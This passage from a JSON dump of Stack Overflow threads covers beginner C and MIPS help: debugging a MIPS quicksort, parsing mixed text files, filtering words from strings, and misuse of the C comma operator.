       printf(\"%s\", input);\n       }\n       if(EOF){\n          printf(\"EOF\");\n       }\n\n        return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "mips", "mips32"], "comments": [{"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542186470, "post_id": 53291196, "comment_id": 93473789, "body": "In <code>void QuickSort(int *array, int first, int last)</code> the first parameter is a pointer to <code>int</code>, but when calling <code>QuickSort(array, first, q-1)</code> are you sure it shouldn&#39;t be something like <code>QuickSort(&amp;array[0], first, q-1)</code> ?"}, {"owner": {"reputation": 3902, "user_id": 10302746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5ySG.png?s=128&g=1", "display_name": "Lev M.", "link": "https://stackoverflow.com/users/10302746/lev-m"}, "reply_to_user": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 1, "creation_date": 1542360118, "post_id": 53291196, "comment_id": 93548666, "body": "@luci88filter - no, they are the same thing. There is no problem with the C code. It works fine. The problem is somewhere in the assembly, but I am no sure where. Jose - try stepping through the code one line at a time. There is a button for this in mars."}, {"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "reply_to_user": {"reputation": 3902, "user_id": 10302746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5ySG.png?s=128&g=1", "display_name": "Lev M.", "link": "https://stackoverflow.com/users/10302746/lev-m"}, "edited": false, "score": 0, "creation_date": 1542365722, "post_id": 53291196, "comment_id": 93551593, "body": "@Lev M. That is correct, the code seems to be working. A nice emulator for MIPS assembly would be nice, as I am very curious what the problem is."}, {"owner": {"reputation": 3902, "user_id": 10302746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5ySG.png?s=128&g=1", "display_name": "Lev M.", "link": "https://stackoverflow.com/users/10302746/lev-m"}, "reply_to_user": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542376883, "post_id": 53291196, "comment_id": 93557528, "body": "@luci88filter the code if for the MARS simulator you can download for free from here: <a href=\"http://courses.missouristate.edu/KenVollmar/mars/download.htm\" rel=\"nofollow noreferrer\">courses.missouristate.edu/KenVollmar/mars/download.htm</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3743, "user_id": 10630900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ece5V.png?s=128&g=1", "display_name": "Minn", "link": "https://stackoverflow.com/users/10630900/minn"}, "edited": false, "score": 1, "creation_date": 1543679073, "post_id": 53349728, "comment_id": 94009184, "body": "The shift-left-logical is used because he wants to use word offsets (equivalent to times 4), so he is simply doing pointer arithmetic here. Although he doesn&#39;t use <code>.word</code> in the data segment which is a bit confusing. The three instructions are simply <code>*(array + last)</code> or <code>array[last]</code> as commented."}, {"owner": {"reputation": 3902, "user_id": 10302746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5ySG.png?s=128&g=1", "display_name": "Lev M.", "link": "https://stackoverflow.com/users/10302746/lev-m"}, "reply_to_user": {"reputation": 3743, "user_id": 10630900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ece5V.png?s=128&g=1", "display_name": "Minn", "link": "https://stackoverflow.com/users/10630900/minn"}, "edited": false, "score": 0, "creation_date": 1544196466, "post_id": 53349728, "comment_id": 94202299, "body": "@Minn thanks, you were right, I missed the 2 lines after that one."}], "tags": [], "owner": {"reputation": 3902, "user_id": 10302746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5ySG.png?s=128&g=1", "display_name": "Lev M.", "link": "https://stackoverflow.com/users/10302746/lev-m"}, "is_accepted": false, "score": 2, "last_activity_date": 1544196399, "last_edit_date": 1544196399, "creation_date": 1542445331, "answer_id": 53349728, "question_id": 53291196, "link": "https://stackoverflow.com/questions/53291196/what-is-the-problem-with-this-quick-sort-in-mips/53349728#53349728", "title": "What is the problem with this quick sort in MIPS?", "body": "<p><strong>EDIT:</strong><br>\nAs pointed out by Minn in a comment, I missed the two lines following:</p>\n\n<pre><code>sll $t1, $a2, 2         #int value = array[last];\n</code></pre>\n\n<p>So while this single line does not match the comment in it, the loading of the value seems correct.</p>\n\n<p><strong>END EDIT</strong></p>\n\n<p>I am not familiar with this specific assembly, but the problem seems to be what is known as <a href=\"https://en.wikipedia.org/wiki/Clobbering\" rel=\"nofollow noreferrer\">\"register clobbering\"</a> :</p>\n\n<p>According to <a href=\"http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html\" rel=\"nofollow noreferrer\">documentation</a> <code>jal</code> only stores the return address, but does not store any of the registers.</p>\n\n<pre><code>    lw $a1, first           #first value on the second parameter\n    subi $a2, $t0, 1        #q-1\n    jal quick_sort          #QuickSort(array,first,q-1)\n    addi $a1, $t0, 1        #q+1\n    lw $a2, last            #last value on the third parameter\n    jal quick_sort\n</code></pre>\n\n<p>You are using <code>$t0</code> as <code>q</code> local variable, but you never save it on the stack.</p>\n\n<p>After the first call <code>jal quick_sort          #QuickSort(array,first,q-1)</code> the value of $t0 would be different, but you use it immediately in the line <code>addi $a1, $t0, 1        #q+1</code> as if it never changed, and then pass the result to the second call to <code>QuickSort</code>.</p>\n\n<p>The C equivalent to this error would be to make <code>q</code> global and add <code>q = 0;</code> at the beginning of the function.</p>\n\n<p>You must remember, that when working in assembly and using registers for local variables, you must save their state to the stack before calling any other function from your current function, otherwise you will lose state and your code will not work as expected!</p>\n\n<p>To be honest, this is my first time seeing this particular assembly language, so there might be other errors I missed, but these are the most obvious ones so they were easy to spot.</p>\n"}], "owner": {"reputation": 1, "user_id": 10561315, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-pG0Yb3Haohw/AAAAAAAAAAI/AAAAAAAAACo/TD1o1HVN_NA/photo.jpg?sz=128", "display_name": "Jose Masri", "link": "https://stackoverflow.com/users/10561315/jose-masri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 386, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544196399, "creation_date": 1542153355, "question_id": 53291196, "link": "https://stackoverflow.com/questions/53291196/what-is-the-problem-with-this-quick-sort-in-mips", "title": "What is the problem with this quick sort in MIPS?", "body": "<p>This is the C code i am using to make the quick sort on the MIPS, on the Mars editor i am having issues when running these code </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid QuickSort(int *array, int first, int last){\n    int q;\n    if (first&lt;last){\n        int value = array[last];\n        int i = first-1;\n        int tmp;\n        int j = first;\n        while(j&lt;=last){\n            if (array[j] &lt;= value) {\n              i++;\n              tmp = array[i];\n              array[i] = array[j];\n              array[j] = tmp;\n            }\n          j++;\n       }\n       q = i;\n       QuickSort(array,first,q-1);\n       QuickSort(array,q+1,last);\n    }\n}\n</code></pre>\n\n<p>And this is my MIPS translation so far, i am getting an infinite loop</p>\n\n<pre><code>.data\nnumArray: 30, 15, 11, 40, 75, 80, 70, 60\nfirst: 0\nlast: 7\n    .text\nmain:\n        la $a0, numArray\n        lw $a1, first\n        lw $a2, last\n        jal quick_sort\n        li $v0, 10\n        syscall\n\nquick_sort:\n        subi $sp, $sp, 4        #reserving memory in the stack\n        sw $ra, 4($sp)          #storing the return adress in the stack\n        xor $t0, $t0, $t0       #int q\n        bge $a1, $a2, label1    #if (first&lt;last)\n        sll $t1, $a2, 2         #int value = array[last];\n        add $t1, $t1, $a0       #callculating array[last] in $t1\n        lw $t1, 0($t1)          #array[last] = array direction + 4 * last\n        or $t2, $t1, $zero      #$t2 will be value\n        subi $t3, $a1, 1        #int i = first-1;\n        xor $t4, $t4, $t4       #int tmp\n        or $t5, $a1, $zero      #int j=first\n        j label2                #while(j&lt;=last)\n    label3: sll $t6, $a2, 2     #calculating array[j] adress\n        add $t6, $t6, $a0\n        lw $t7, 0($t6)          #calculating array[j] value\n        bgt $t7, $t1, label4    #if (array[j] &lt;= value)\n        addi $t3, $t3, 1        #i++\n        sll $s0, $t3, 2         #calculating array[i] adress\n        add $s0, $s0, $a0   \n        lw $s1, 0($s0)          #calculating array[i] value\n        or $t4, $s1, $zero      #tmp = array[i]\n        sw $t7, 0($s0)          #array[i] = array[j];\n        sw $t4, 0($t6)          #array[j] = tmp;\n    label4: addi $t5, $t5, 1    #end if; j++\n    label2: ble $t5, $a2, label3    #while condition\n        or $t0, $t3, $zero      #q = i\n        lw $a1, first           #first value on the second parameter\n        subi $a2, $t0, 1        #q-1\n        jal quick_sort          #QuickSort(array,first,q-1)\n        addi $a1, $t0, 1        #q+1\n        lw $a2, last            #last value on the third parameter\n        jal quick_sort          #QuickSort(array,q+1,last);\n    label1: lw $ra, 4($sp)      #Recovering the return address from the stack \n        addi $sp, $sp, 4        #releasing memory\n        jr $ra                  #going to the return address\n</code></pre>\n\n<p>Maybe i need to store something more on the stack or something that i am missing, thanks for your help, anything that you see strange there please let me know to check it.</p>\n"}, {"tags": ["c", "arrays", "string", "pointers"], "comments": [{"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542163933, "post_id": 53291110, "comment_id": 93466396, "body": "The way you are scanning with <code>%s</code>, then storing into the character-array <code>arrayWords</code> is not correct. I suggest you do some reading on C string handling, and <code>printf()</code>/<code>scanf()</code> codes."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7576037, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/1841978539378658/picture?type=large", "display_name": "\u10da\u10e3\u10d9\u10d0 \u10e9\u10d8\u10e2\u10d8\u10e8\u10d5\u10d8\u10da\u10d8", "link": "https://stackoverflow.com/users/7576037/%e1%83%9a%e1%83%a3%e1%83%99%e1%83%90-%e1%83%a9%e1%83%98%e1%83%a2%e1%83%98%e1%83%a8%e1%83%95%e1%83%98%e1%83%9a%e1%83%98"}, "edited": false, "score": 0, "creation_date": 1542162450, "post_id": 53291820, "comment_id": 93466062, "body": "I don&#39;t have problems with int, I have lines which begin with string and continues with numbers, I can use char to output whole lines, but I can&#39;t take that first string and put it in one array and later take those numbers on the same line and put them in another array, that is my problem"}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "reply_to_user": {"reputation": 11, "user_id": 7576037, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/1841978539378658/picture?type=large", "display_name": "\u10da\u10e3\u10d9\u10d0 \u10e9\u10d8\u10e2\u10d8\u10e8\u10d5\u10d8\u10da\u10d8", "link": "https://stackoverflow.com/users/7576037/%e1%83%9a%e1%83%a3%e1%83%99%e1%83%90-%e1%83%a9%e1%83%98%e1%83%a2%e1%83%98%e1%83%a8%e1%83%95%e1%83%98%e1%83%9a%e1%83%98"}, "edited": false, "score": 0, "creation_date": 1542164132, "post_id": 53291820, "comment_id": 93466450, "body": "Use <code>fgets()</code> to read a line from the file into a <code>char *buffer</code>."}, {"owner": {"reputation": 11, "user_id": 7576037, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/1841978539378658/picture?type=large", "display_name": "\u10da\u10e3\u10d9\u10d0 \u10e9\u10d8\u10e2\u10d8\u10e8\u10d5\u10d8\u10da\u10d8", "link": "https://stackoverflow.com/users/7576037/%e1%83%9a%e1%83%a3%e1%83%99%e1%83%90-%e1%83%a9%e1%83%98%e1%83%a2%e1%83%98%e1%83%a8%e1%83%95%e1%83%98%e1%83%9a%e1%83%98"}, "edited": false, "score": 0, "creation_date": 1542164907, "post_id": 53291820, "comment_id": 93466638, "body": "Yep, now I can somehow focus on one line, but still there is a problem. I still have mixed string, with letters and numbers, it starts with word PROGRAMMING and continues with few numbers, How can I take only this programming and add it to string array ?"}], "tags": [], "owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "is_accepted": false, "score": 0, "last_activity_date": 1542163711, "last_edit_date": 1542163711, "creation_date": 1542158254, "answer_id": 53291820, "question_id": 53291110, "link": "https://stackoverflow.com/questions/53291110/c-mixed-text-file-data-to-different-arrays-int-and-string/53291820#53291820", "title": "C - Mixed Text File Data &gt; To Different Arrays (Int and String)", "body": "<p>It's easy to parse these lists of space-separated numbers using the <code>strtol()</code> function.  This is a good solution because it handily sets a pointer to the <em>next</em> block of whitespace/non-number after the number it just converted. If there's no number to convert, it just sends back the original pointer. So the code tests for this to know when it's complete.</p>\n\n<p>EDIT: Updated to handle name too.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(void)\n{\n    char *number_str = \"SomeWords 19 9 6 2 22 1 0 -4\";\n    char *ptr;\n    char *next_number;\n    int   numbers[1000];\n    int   number_count = 0;\n    char  name[100];\n\n    next_number = number_str;\n\n    // Copy off the name\n    ptr = strchr(number_str, ' ');\n    if (ptr != NULL)\n    {\n        strncpy(name, number_str, ptr-number_str);  // TODO - check bounds of name[]\n        name[ptr-number_str] = '\\0';\n\n        // Point to the first number\n        next_number = ptr+1;\n\n        printf(\"Stored name [%s]\\n\", name);\n    }\n\n    // Then parse all the numbers\n    do \n    {\n        ptr = next_number;\n        long num = strtol(ptr, &amp;next_number, 10);\n        if (ptr != next_number) // found one\n        {\n            numbers[number_count] = (int)num;\n            printf(\"Stored %3d into numbers[%d]\\n\", numbers[number_count], number_count);\n            number_count += 1;\n        }\n    } while(ptr != next_number);\n\n    return 0;\n}\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>Stored name [SomeWords]\nStored  19 into numbers[0]\nStored   9 into numbers[1]\nStored   6 into numbers[2]\nStored   2 into numbers[3]\nStored  22 into numbers[4]\nStored   1 into numbers[5]\nStored   0 into numbers[6]\nStored  -4 into numbers[7]\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7576037, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/1841978539378658/picture?type=large", "display_name": "\u10da\u10e3\u10d9\u10d0 \u10e9\u10d8\u10e2\u10d8\u10e8\u10d5\u10d8\u10da\u10d8", "link": "https://stackoverflow.com/users/7576037/%e1%83%9a%e1%83%a3%e1%83%99%e1%83%90-%e1%83%a9%e1%83%98%e1%83%a2%e1%83%98%e1%83%a8%e1%83%95%e1%83%98%e1%83%9a%e1%83%98"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 75, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542163711, "creation_date": 1542152677, "question_id": 53291110, "link": "https://stackoverflow.com/questions/53291110/c-mixed-text-file-data-to-different-arrays-int-and-string", "title": "C - Mixed Text File Data &gt; To Different Arrays (Int and String)", "body": "<p>I have just an ordinary \"project.txt\" file with this data:</p>\n\n<pre><code>Programming 10 3 4 5 4 3 2 4 5 2 3\nMathematics 8 3 3 4 5 3 2 2 3\nPhysics 6 3 4 5 3 4 5\nDesign 6 5 4 5 3 2 4\nLogistics 8 3 4 5 3 1 1 2 3\n</code></pre>\n\n<p>Need to open this file, read and write all this data to arrays.\nI need to somehow divide String and Integers from each other.\n<strong>* NO NEED FOR IT RIGHT NOW, but later I will need to write text and numbers to different files. ***NO NEED TO DO THIS NOW*</strong> </p>\n\n<p>Just need to do it with 2 different int and char arrays, but I am sitting for few hours and can't find normal explanation of how to divide this string from other things.</p>\n\n<p>Here is my code, can anybody help me?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\nFILE *fp;\nfp = fopen(\"C:\\\\Project\\\\project.txt\", \"r\");\nchar arrayWords[140];\nint i;\n\nif(fp == NULL){\n    printf(\"Can't Read The File!\");\n    exit(0);\n}\n\nfor (i = 0; i &lt; 140; i++){\n    fscanf(fp, \"%s,\", &amp;arrayWords[i]);\n}\n\nfor (i = 0; i &lt; 140; i++){\n    printf(\"Number is: %s\\n\\n\", &amp;arrayWords[i]);\n}\n\n\nfclose(fp);\nreturn 0;\n</code></pre>\n\n<p>}</p>\n\n<p>This is the output I get, it is really confusing (Some part of it)...</p>\n\n<pre><code>Number is: P13454324523M833453223P6345345D6545324L834531123\n\nNumber is: 13454324523M833453223P6345345D6545324L834531123\n\nNumber is: 3454324523M833453223P6345345D6545324L834531123\n\nNumber is: 454324523M833453223P6345345D6545324L834531123\n\nNumber is: 54324523M833453223P6345345D6545324L834531123\n\nNumber is: 4324523M833453223P6345345D6545324L834531123\n\nNumber is: 324523M833453223P6345345D6545324L834531123\n\nNumber is: 24523M833453223P6345345D6545324L834531123\n\nNumber is: 4523M833453223P6345345D6545324L834531123\n\nNumber is: 523M833453223P6345345D6545324L834531123\n\nNumber is: 23M833453223P6345345D6545324L834531123\n\nNumber is: 3M833453223P6345345D6545324L834531123\n\nNumber is: M833453223P6345345D6545324L834531123\n\nNumber is: 833453223P6345345D6545324L834531123\n\nNumber is: 33453223P6345345D6545324L834531123\n\nNumber is: 3453223P6345345D6545324L834531123\n\nNumber is: 453223P6345345D6545324L834531123\n\nNumber is: 53223P6345345D6545324L834531123\n\nNumber is: 3223P6345345D6545324L834531123\n\nNumber is: 223P6345345D6545324L834531123\n\nNumber is: 23P6345345D6545324L834531123\n\nNumber is: 3P6345345D6545324L834531123\n\nNumber is: P6345345D6545324L834531123\n\nNumber is: 6345345D6545324L834531123\n\nNumber is: 345345D6545324L834531123\n\nNumber is: 45345D6545324L834531123\n\nNumber is: 5345D6545324L834531123\n\nNumber is: 345D6545324L834531123\n\nNumber is: 45D6545324L834531123\n\nNumber is: 5D6545324L834531123\n</code></pre>\n\n<p>Think problem is in pointers, but don't know, I am kind of a beginner and can't find any problems. </p>\n\n<p>Thanks to everyone</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1542152785, "post_id": 53291047, "comment_id": 93463904, "body": "1: Input a word. 2: Does it contain the word you&#39;re blocking? 3: If not, print the word. 4: Repeat. (If you need help turning that into C code, you&#39;ll have to make a bit more effort. Please take a look at the <a href=\"https://stackoverflow.com/help\">help center</a> pages and edit your question to include the code you&#39;ve written so far and explain why it isn&#39;t working how you expected.)"}, {"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1542154004, "post_id": 53291047, "comment_id": 93464167, "body": "This question doesn&#39;t show much research effort. I count at least 4 posts in the <i>Related</i> list over there ---&gt;&gt;&gt; that could potentially help you, and that&#39;s just the ones that this site found when you posted this question. Imagine what you might be able to find if you did a search here yourself and read some of the results of that search."}], "answers": [{"tags": [], "owner": {"reputation": 3, "user_id": 7066040, "user_type": "registered", "profile_image": "https://graph.facebook.com/10209098441951311/picture?type=large", "display_name": "Yined Milanyela Molina Barrios", "link": "https://stackoverflow.com/users/7066040/yined-milanyela-molina-barrios"}, "is_accepted": false, "score": -2, "last_activity_date": 1542174782, "creation_date": 1542174782, "answer_id": 53293940, "question_id": 53291047, "link": "https://stackoverflow.com/questions/53291047/how-would-i-parse-strings-in-c-and-ignore-a-certain-word-in-that-string/53293940#53293940", "title": "How would I parse strings in c and ignore a certain word in that string?", "body": "<p>you can split word, later eval the val return:</p>\n\n<p><a href=\"http://c.conclase.net/librerias/?ansifun=strtok\" rel=\"nofollow noreferrer\">http://c.conclase.net/librerias/?ansifun=strtok</a></p>\n"}], "owner": {"reputation": 129, "user_id": 9947321, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67d465247b0c42cd8ae52f68688a12ec?s=128&d=identicon&r=PG&f=1", "display_name": "J.Doe", "link": "https://stackoverflow.com/users/9947321/j-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1542174782, "creation_date": 1542152041, "question_id": 53291047, "link": "https://stackoverflow.com/questions/53291047/how-would-i-parse-strings-in-c-and-ignore-a-certain-word-in-that-string", "title": "How would I parse strings in c and ignore a certain word in that string?", "body": "<p>How would I parse strings in c to ignore certain characters?</p>\n\n<p>Say I have code that contains the word, \"contain\", so basically:</p>\n\n<pre><code> contains blah sdkld sldksdk\n contains dksld sldkd tkel\n</code></pre>\n\n<p>So basically, I want to get:</p>\n\n<pre><code>blah sdkld sldksdk\ndksld sldkd tkel\n</code></pre>\n"}, {"tags": ["c", "function", "pointers"], "comments": [{"owner": {"reputation": 25, "user_id": 8169047, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/955b826dab3edb90915ae4f46aef09a2?s=128&d=identicon&r=PG&f=1", "display_name": "Jacob Breckenridge", "link": "https://stackoverflow.com/users/8169047/jacob-breckenridge"}, "reply_to_user": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "edited": false, "score": 0, "creation_date": 1542152101, "post_id": 53290989, "comment_id": 93463741, "body": "@Groo Thanks! That makes sense of it."}], "answers": [{"tags": [], "owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "is_accepted": true, "score": 1, "last_activity_date": 1542152113, "creation_date": 1542152113, "answer_id": 53291056, "question_id": 53290989, "link": "https://stackoverflow.com/questions/53290989/methods-of-tracking-pointer-objects-through-functions-in-c/53291056#53291056", "title": "Methods of tracking pointer objects through functions in C", "body": "<p>You cannot return tuples from functions in C. When you separate values using a comma in C, the whole expression simply evaluates to the last member.</p>\n\n<p>So when you write:</p>\n\n<pre><code>a, b, c = some_function();\n</code></pre>\n\n<p>It really means:</p>\n\n<pre><code>/* do nothing */, /* do nothing */, c = some_function();\n</code></pre>\n\n<p>If you want to return a composite data structure, use a <code>struct</code>, i.e.</p>\n\n<pre><code>struct subarray\n{\n    int low;\n    int high;\n    int sum;\n};\n\nvoid findMaximumSubarray(int A[], int low, int high, struct subarray * result);\n</code></pre>\n\n<p>If the struct is small and you are using a modern compiler, and not running on an embedded system, then you can also return the struct by value:</p>\n\n<pre><code>struct subarray findMaximumSubarray(int A[], int low, int high);\n</code></pre>\n\n<p>The latter syntax simplifies usage, but it can become an issue if you start <a href=\"https://stackoverflow.com/q/30980759/69809\">returning huge structs</a> this way.</p>\n"}], "owner": {"reputation": 25, "user_id": 8169047, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/955b826dab3edb90915ae4f46aef09a2?s=128&d=identicon&r=PG&f=1", "display_name": "Jacob Breckenridge", "link": "https://stackoverflow.com/users/8169047/jacob-breckenridge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 28, "favorite_count": 0, "accepted_answer_id": 53291056, "answer_count": 1, "score": 2, "last_activity_date": 1542152113, "creation_date": 1542151596, "question_id": 53290989, "link": "https://stackoverflow.com/questions/53290989/methods-of-tracking-pointer-objects-through-functions-in-c", "title": "Methods of tracking pointer objects through functions in C", "body": "<p>I'm stuck trying to implement pseudocode from an algorithm book. My code compiles and prints out the correct answer, except some of the information I want to print out is not displaying correctly. Here's what the console output looks like:</p>\n\n<p><b></p>\n\n<pre><code>Correct Solution Tested: \nmax_left= 7 \nmax_right= 10 \nsum= 43\n\n\nFailing Outputs:\ncurr_cross_low = 17; curr_cross_high = -1; curr_cross_sum = 38\ncurr_cross_low = -1; curr_cross_high = -1; curr_cross_sum = 18\ncurr_cross_low = 32766; curr_cross_high = -272632720; curr_cross_sum = 43\n\nmax_left_full= 32766 \nmax_right_full= -272632512\nsum_full= 43\n\nProgram ended with exit code: 0\n</code></pre>\n\n<p></b>\n</p>\n\n<p>The first three values printed are the correct results arrived by brute implementation of one part of the algorithm. In the code, this is the function \"findMaxCrossingSubarray\" all by itself. The second part printed out is when I execute the full algorithm \"findMaximumSubarray\". I believe it should be printing out results that show approaching the solution. The final answer given by the variable \"sum_full\" appears to be correct since it matches the brute force solution which the book says is the correct answer.</p>\n\n<p>I've been trying to find how I can print the correct max_left_full and max_right_full values and not what I believe is the memory address. I'm at a point where if I change a pointer in one place it makes the solution incorrect or print out a memory address as well. </p>\n\n<p>Is there a simple way to find where I may be dropping the ball?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\n//returns a pointer to a value equal to the set of changes\nint * returnPriceChanges(int sz, int A[]){\n    int MAX_SIZE = 256;\n    static int* C;\n    C =  malloc(MAX_SIZE *sizeof(int));\n    int i;\n    for(i=0;i&lt;sz-1;i++){\n        C[i]=A[i+1]-A[i];\n    }\n    return C;\n}\n\nint findMaxCrossingSubarray(int A[], int low, int mid, int high, int* max_left, int* max_right){\n    double left_sum = -INFINITY;\n    int sum = 0;\n    for(int i=mid;i&gt;=low;i--){\n        sum=sum+A[i];\n        if(sum &gt; left_sum){\n            left_sum = sum;\n            *max_left = i;\n        }\n    }\n    double right_sum = -INFINITY;\n    sum = 0;\n    for(int j=mid+1; j&lt;=high;j++){\n        sum=sum+A[j];\n        if(sum &gt; right_sum){\n            right_sum = sum;\n            *max_right = j;\n        }\n    }\n    return (*max_left, *max_right, left_sum+right_sum);\n}\n\nint findMaximumSubarray(int A[], int low, int high){\n    int curr_left_low, curr_left_high, curr_left_sum;\n    int curr_right_low, curr_right_high, curr_right_sum;\n    int curr_cross_low, curr_cross_high, curr_cross_sum;\n    int mid = 0;\n    int* temp_max_left, temp_max_right;\n    if(high==low){\n        return(low, high, A[low]);\n    }\n    else{\n        mid =floor((high+low)/2);\n        curr_left_low, curr_left_high, curr_left_sum = findMaximumSubarray(A, low, mid);\n        curr_right_low, curr_right_high, curr_right_sum = findMaximumSubarray(A, mid+1,high);\n        curr_cross_low, curr_cross_high, curr_cross_sum = findMaxCrossingSubarray(A, low, mid, high, &amp;temp_max_left, &amp;temp_max_right);\n        if(curr_left_sum&gt;=curr_right_sum &amp;&amp; curr_left_sum&gt;=curr_cross_sum){\n            return (curr_left_low, curr_left_high, curr_left_sum);\n        }\n        else if(curr_right_sum&gt;= curr_left_sum &amp;&amp; curr_right_sum&gt;=curr_cross_sum){\n            return (curr_right_low, curr_right_high, curr_right_sum);\n        }\n        else{\n            printf(\"curr_cross_low = %d; curr_cross_high = %d; curr_cross_sum = %d\\n\", curr_cross_low, curr_cross_high, curr_cross_sum);\n            return (curr_cross_low, curr_cross_high, curr_cross_sum);\n        }\n    }\n}\n\nint main(){\n    int prices[] = {100,113,110,85,105,102,86,63,81,101,94,106,101,79,94,90,97};\n    int szPrices = sizeof(prices)/sizeof(prices[0]);\n    int changes[szPrices-1];\n    int *P;\n    P = returnPriceChanges(szPrices,prices);\n    //set C = to list of changes\n    for(int i=0; i&lt;szPrices-1; i++){\n        changes[i]=*(P+i);\n    }\n    int max_left, max_right, sum;\n    max_left, &amp;max_right, sum = findMaxCrossingSubarray(changes, 0, 8, 16, &amp;max_left, &amp;max_right);\n    printf(\"\\nCorrect Solution Tested: \\nmax_left= %d \\nmax_right= %d \\nsum= %d\\n\\n\", max_left, max_right, sum);\n    printf(\"\\nFailing Outputs:\\n\");\n    int max_left_full, max_right_full, sum_full;\n    max_left_full, &amp;max_right_full, sum_full = findMaximumSubarray(changes, 0, 16);\n    printf(\"\\nmax_left_full= %d \\nmax_right_full= %d\\nsum_full= %d\\n\\n\", max_left_full, max_right_full, sum_full);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "average"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1542149290, "post_id": 53290617, "comment_id": 93463038, "body": "A hint for starters: You do not need to store the full sequence of numbers, just add up the positive ones and keep a counter tracking how many you added. Divide after that."}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": 